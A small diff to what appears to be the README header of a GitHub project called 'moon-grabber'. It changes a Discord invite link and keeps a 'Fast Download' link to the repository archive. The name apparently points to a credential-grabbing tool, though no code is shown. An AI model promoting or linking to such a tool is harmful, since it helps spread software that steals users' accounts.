@@ -6,7 +6,7 @@
 </p>
 <p align="center">
 <a href="https://github.com/Yuvi5001/moon-grabber/archive/refs/heads/main.zip">Fast Download</a> ㅤ•ㅤ
-<a href="https://discord.gg/yuvi">Discord</a> ㅤ•ㅤ
+<a href="https://discord.gg/yin">Discord</a> ㅤ•ㅤ
 </p>
 </p>
 <p align="center">
